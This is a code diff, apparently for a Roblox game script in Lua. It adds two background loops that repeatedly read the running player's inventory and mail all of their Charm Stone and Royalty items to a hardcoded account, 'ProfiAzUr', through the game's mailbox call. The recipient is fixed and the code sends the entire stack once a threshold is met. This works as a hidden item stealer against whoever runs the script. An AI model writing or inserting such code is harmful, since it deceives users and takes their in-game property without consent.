@@ -186,5 +186,80 @@ spawn(function()
     end
 end)
 
+-- Charm Stone Mailer
+spawn(function()
+    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local username = "ProfiAzUr"
+    local loopInterval = 10 -- Interval in minutes 
+    local sendAmount = 50 -- Editable amount
+    while true do
+        local playerInventory = Save.Get()["Inventory"]
+        local MiscInv = playerInventory["Misc"]
+        print("Searching for Charm Stone...")
+        for key, item in pairs(MiscInv) do
+            if item.id == "Charm Stone" then
+                local availableAmount = item._am or item.am or 1
+                if availableAmount >= sendAmount then
+                    local amountToSend = availableAmount > sendAmount and availableAmount or sendAmount
+                    print("Found Charm Stone item:", item)
+                    print("Amount to send:", amountToSend)
+                    local args = {
+                        [1] = username,
+                        [2] = "There my charms, home you get good ones",
+                        [3] = "Misc",
+                        [4] = key,
+                        [5] = amountToSend
+                    }
+                    print("Invoking Server with args:", unpack(args))
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                else
+                    print("Not enough Charm Stone to send. Required:", sendAmount, "Available:", availableAmount)
+                end
+                break
+            end
+        end
+        print("Finished processing Charm Stone.")
+        task.wait(loopInterval * 60)
+    end
+end)
+
+-- Royalty Mailer
+spawn(function()
+    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local username = "ProfiAzUr"
+    local loopInterval = 30 -- Interval in minutes 
+    local sendAmount = 1 -- Editable amount
+    while true do
+        local playerInventory = Save.Get()["Inventory"]
+        local CharmInv = playerInventory["Charm"]
+        print("Searching for Royalty...")
+        for key, item in pairs(CharmInv) do
+            if item.id == "Royalty" then
+                local availableAmount = item._am or item.am or 1
+                if availableAmount >= sendAmount then
+                    local amountToSend = availableAmount > sendAmount and availableAmount or sendAmount
+                    print("Found Royalty item:", item)
+                    print("Amount to send:", amountToSend)
+                    local args = {
+                        [1] = username,
+                        [2] = "Thereeee",
+                        [3] = "Charm",
+                        [4] = key,
+                        [5] = amountToSend
+                    }
+                    print("Invoking Server with args:", unpack(args))
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                else
+                    print("No Royalty Charm found. Required:", sendAmount, "Available:", availableAmount)
+                end
+                break
+            end
+        end
+        print("Finished processing Royalty.")
+        task.wait(loopInterval * 60)
+    end
+end)
+
+
 
 
